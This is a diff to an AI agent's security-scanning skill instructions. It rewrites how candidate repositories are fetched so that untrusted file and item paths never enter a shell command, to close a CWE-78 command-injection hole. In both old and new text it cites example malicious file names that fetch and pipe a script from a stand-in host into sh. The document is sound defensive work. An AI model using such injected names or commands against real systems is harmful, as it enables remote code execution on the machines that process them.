@@ -80,45 +80,64 @@ Do NOT stop at frontmatter. Do NOT scan only the SKILL.md/agent.md. Read the **f
 A git tree entry's path can contain almost any byte — only NUL is
 structurally forbidden, and `/` is a nesting convention, not an enforced
 restriction — so a malicious candidate can name a file or directory
-`` `curl evil.tld|sh` `` or `$(curl evil.tld|sh)`. You build each Bash tool
-call by writing its literal command text, so a recipe that interpolates a
-path taken from the candidate's own tree — e.g. the old
-`gh api "repos/<owner>/<repo>/contents/<full-file-path>?ref=<commit-sha>"` —
-lets the shell resolve any backtick/`$()` inside that path as command
-substitution **before** `gh api` itself runs. Double-quoting does not stop
-this; only never embedding the raw value does. This is CWE-78 in the one
-gate meant to catch the candidate before anything from it runs — it applies
-to fetching files for ALL three types below (skill / agent / plugin), not
-just skill.
+`` `curl evil.tld|sh` `` or `$(curl evil.tld|sh)`. That applies not only to
+files inside the item (the old `<full-file-path>` vulnerability below) but
+to the item's own path too — e.g. the `<path>` in a vendored agent's
+`<owner>/<repo>:<path>` identifier is chosen by the candidate's author,
+exactly like any other name in their tree. You build each Bash tool call by
+writing its literal command text, so a recipe that interpolates ANY such
+value into a Bash/`gh api` command — the old
+`gh api "repos/<owner>/<repo>/contents/<full-file-path>?ref=<commit-sha>"`,
+or even a `find <item-path>` scoped to the item's own directory — lets the
+shell resolve any backtick/`$()` inside that value as command substitution
+**before** the intended command itself runs. Double-quoting does not stop
+this; only never letting an untrusted value cross a shell does. This is
+CWE-78 in the one gate meant to catch the candidate before anything from it
+runs — it applies to fetching files for ALL three types below (skill /
+agent / plugin), not just skill.
 
-Fetch every file this way instead:
+Fetch every file this way instead — no untrusted byte (item content, item
+path, or repo metadata) is ever written into a Bash/`gh api` command line:
 
-1. **Validate `<owner>`, `<repo>`, and `<commit-sha>`/`<ref>` before using
-   them anywhere.** Even though these come from this skill's own trusted
-   Input (the candidate identifier), not the candidate's tree, validate them
-   the same way `inspect/SKILL.md` Step 1 does before any interpolation —
-   each must match `^[A-Za-z0-9._/-]+$`, must not start with `-`, and must
-   not contain `..` or `@{`. Refuse and report if any fail.
-2. **Shallow-clone the candidate once** — reuse a checkout a prior
-   repo-indexer scan already populated if one exists (same
-   `~/.ievo/checkouts/<owner>-<repo>/` convention `scan_repo.mjs` uses):
+1. **Validate `<owner>` and `<repo>`** against GitHub's own slug charset
+   before using them anywhere — owner matches `^[A-Za-z0-9][A-Za-z0-9-]{0,38}$`,
+   repo matches `^[A-Za-z0-9._-]{1,100}$` (the same constraint
+   `scan_repo.mjs`'s `OWNER_REPO_RE` enforces). Refuse and report if either
+   fails.
+2. **Resolve `<commit-sha>`** — nothing in this skill's Input carries one, so
+   resolve it fresh each scan: `gh api "repos/<owner>/<repo>" --jq
+   '.default_branch'`, then `gh api
+   "repos/<owner>/<repo>/commits/<default-branch>" --jq '.sha'`. Both calls
+   interpolate only the already-validated `<owner>`/`<repo>` (plus the first
+   call's own trusted output) — never candidate-tree content. Validate the
+   result matches `^[0-9a-f]{7,40}$` before using it further.
+3. **Shallow-clone into a fresh, per-invocation directory** — `mktemp -d`
+   (shell-generated, never candidate-influenced), not a shared
+   `~/.ievo/checkouts/<owner>-<repo>/` path: `security-auditor` dispatches
+   one scan per candidate **in parallel** (`/ievo:init` Step 8), so two
+   candidates from the same repo scanning concurrently would otherwise race
+   on a shared checkout's `.git` state.
    ```bash
-   git clone --depth 1 "https://github.com/<owner>/<repo>.git" ~/.ievo/checkouts/<owner>-<repo>/ 2>/dev/null
-   git -C ~/.ievo/checkouts/<owner>-<repo>/ fetch --depth 1 origin <commit-sha>
-   git -C ~/.ievo/checkouts/<owner>-<repo>/ checkout <commit-sha>
+   CHECKOUT_DIR=$(mktemp -d)
+   git clone --depth 1 "https://github.com/<owner>/<repo>.git" "$CHECKOUT_DIR"
+   git -C "$CHECKOUT_DIR" fetch --depth 1 origin <commit-sha>
+   git -C "$CHECKOUT_DIR" checkout <commit-sha>
    ```
-3. **Enumerate files** under the item's path with `find <dir> -type f`. Its
-   output is inert text for you to read — never copy a listed path into
-   another Bash/`gh api` command.
-4. **Read every listed file with the Read tool**, passing the joined local
-   path (e.g. `~/.ievo/checkouts/<owner>-<repo>/<listed-path>`) as its
-   `file_path` parameter directly. The Read tool touches the filesystem, not
-   a shell — bytes in the path can never be interpreted as command syntax.
+4. **Enumerate files** under the item's path with the **Glob tool**
+   (`pattern: "**/*"`, `path: "$CHECKOUT_DIR/<item-path>"`) — never a Bash
+   `find`/`ls`. The item's own path (e.g. a skill/agent directory name) is
+   exactly as untrusted as any file inside it; the Glob tool takes `path` as
+   a direct parameter, never shell text, so it can't be exploited even if
+   that name contains shell metacharacters.
+5. **Read every listed file with the Read tool**, passing its full path as
+   the `file_path` parameter directly — same reasoning as step 4: a direct
+   tool parameter is never interpreted as command syntax.
 
-If the clone itself fails (private repo, no network) do not fall back to
-per-file `gh api` fetching — that reintroduces the injection this replaces.
-Instead treat the scan as reduced-coverage: note it in `reasoning` (Step 5)
-and let the "no shortcut for low-yield scans" rule (Step 4) apply.
+If cloning or resolution fails (private repo, no network) do not fall back
+to per-file `gh api` fetching — that reintroduces the injection this
+replaces. Instead treat the scan as reduced-coverage: note it in
+`reasoning` (Step 5) and let the "no shortcut for low-yield scans" rule
+(Step 4) apply.
 
 ### For type=skill
 
@@ -352,4 +371,4 @@ Tone rules:
 - **RED requires high confidence.** Don't false-positive. If unsure, YELLOW + flag with severity=low.
 - **Report template only on RED.** Don't propose reports for YELLOW — those are install-with-awareness, not block-and-warn.
 - **Neutralize excerpts before they go public.** `report_template.body` is filed as a public, auto-rendering GitHub issue — see § Step 6's "Excerpt containment" note for the fencing rule.
-- **Never interpolate a path taken from the candidate's own tree into a Bash/`gh api` command.** Clone once and read via the Read tool instead — see § "How to fetch files" in Step 2. A git tree entry can legally contain shell metacharacters (backtick, `$()`, `;`, `|`, quotes); only never embedding the raw value in a command string closes that off.
+- **Never interpolate a path — a file inside the candidate, or the candidate's own item path — into a Bash/`gh api` command.** Clone once, enumerate with the Glob tool, and read with the Read tool instead — see § "How to fetch files" in Step 2. A git tree entry can legally contain shell metacharacters (backtick, `$()`, `;`, `|`, quotes); only ever passing such values as direct tool parameters, never embedded in a command string, closes that off.
